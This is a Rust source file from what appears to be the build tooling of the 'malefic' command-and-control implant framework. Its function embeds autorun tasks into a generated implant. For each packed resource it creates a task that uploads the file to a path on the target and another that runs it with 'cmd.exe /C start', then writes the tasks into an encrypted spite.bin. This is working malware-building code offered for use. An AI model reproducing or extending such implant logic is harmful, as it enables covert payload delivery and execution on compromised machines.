use crate::config::ImplantConfig;
use crate::generate::prelude::{parse_yaml, update_prelude_spites};
use crate::{log_info, log_step, log_success};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::Spite;
use std::fs;
use std::path::Path;

/// Helper function to add a module to the list if not already present
fn add_module_if_missing(modules: &mut Vec<String>, module_name: &str) {
    if !modules.contains(&module_name.to_string()) {
        modules.push(module_name.to_string());
    }
}

/// Helper function to create a default Spite structure
fn create_spite(name: &str, body: Body) -> Spite {
    Spite {
        name: name.to_string(),
        task_id: 0,
        r#async: false,
        timeout: 0,
        error: 0,
        status: None,
        body: Some(body),
    }
}

pub fn update_malefic_spites(
    implant_config: &ImplantConfig,
    key: &str,
    source: bool,
) -> anyhow::Result<()> {
    let has_pack = implant_config
        .pack
        .as_ref()
        .map_or(false, |p| !p.is_empty());

    if implant_config.prelude.is_empty() && !has_pack {
        return Ok(());
    }

    log_step!("Generating malefic spites...");

    // Load prelude configuration or create empty ParsedSpites
    let mut parsed = if !implant_config.prelude.is_empty() {
        log_info!(
            "Loading autorun configuration from {}",
            implant_config.prelude
        );
        let autorun_yaml = fs::read_to_string(&implant_config.prelude)?;
        parse_yaml(&autorun_yaml)
    } else {
        use crate::generate::prelude::ParsedSpites;
        ParsedSpites {
            spites: Vec::new(),
            regular_modules: Vec::new(),
            third_modules: Vec::new(),
        }
    };

    // Process pack resources
    if let Some(pack_resources) = &implant_config.pack {
        let resources_path = Path::new("./resources");

        for pack in pack_resources {
            let pack_file = resources_path.join(&pack.src);
            if !pack_file.exists() {
                continue;
            }

            // Create upload spite
            let file_data = fs::read(&pack_file).expect("Failed to read resource file");
            let upload_request =
                Body::UploadRequest(malefic_proto::proto::modulepb::UploadRequest {
                    name: String::new(),
                    r#priv: 0o644,
                    hidden: false,
                    r#override: false,
                    target: pack.dst.clone(),
                    data: file_data,
                });
            parsed.spites.push(create_spite("upload", upload_request));
            add_module_if_missing(&mut parsed.regular_modules, "upload");

            // Create exec spite
            let exec_request = Body::ExecRequest(malefic_proto::proto::modulepb::ExecRequest {
                path: "cmd.exe".to_string(),
                ppid: 0,
                args: vec![
                    "/C".to_string(),
                    "start".to_string(),
                    String::new(),
                    pack.dst.clone(),
                ],
                output: false,
                singleton: true,
                realtime: false,
            });
            parsed.spites.push(create_spite("exec", exec_request));
            add_module_if_missing(&mut parsed.regular_modules, "exec");
        }
    }

    if !parsed.regular_modules.is_empty() {
        super::cargo_features::update_module_toml(&parsed.regular_modules, source);
    }
    if !parsed.third_modules.is_empty() {
        super::cargo_features::update_3rd_toml(&parsed.third_modules);
    }
    update_prelude_spites(parsed, "./resources", key, "spite.bin")?;
    log_success!("Malefic spites have been generated successfully");
    Ok(())
}
